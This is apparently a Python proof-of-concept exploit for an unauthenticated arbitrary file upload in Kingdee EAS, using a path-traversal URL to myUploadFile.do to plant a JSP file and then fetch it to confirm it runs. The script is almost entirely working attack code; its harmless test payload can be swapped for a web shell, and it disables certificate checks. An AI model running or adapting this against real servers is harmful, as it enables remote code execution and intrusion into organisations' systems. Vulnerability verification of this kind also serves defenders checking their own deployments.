#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()


def verify(target):
    burp0_url = target + "/easportal/buffalo/%2e%2e/cm/myUploadFile.do"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx"}
    burp0_data = "------WebKitFormBoundarySq4lDnabv8CwHfvx\r\nContent-Disposition: form-data; name=\"myFile\"; filename=\"test.jsp\"\r\nContent-Type: text/html\r\n\r\n<%out.println(\"test\");%>\r\n------WebKitFormBoundarySq4lDnabv8CwHfvx--"
    
    try:
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
        url2 = target + "/easportal/buffalo/%2e%2e/test.jsp"
        burp0_headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36"}
        r2 = requests.get(url2,headers=burp0_headers2,verify=False)
        if r2.status_code == 200 and "test" in r2.text:
            return url2, r2.text
    except:
        print(sys.exc_info())
        pass

    return "", ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 kingdee-eas-myUploadFile-upload.py ",target)
    url, data = verify(target)
    if url != "":
        print("[+]漏洞存在，上传后的文件路径为：", url, "\n内容为：", data)
    else:
        print("[-]漏洞不存在")
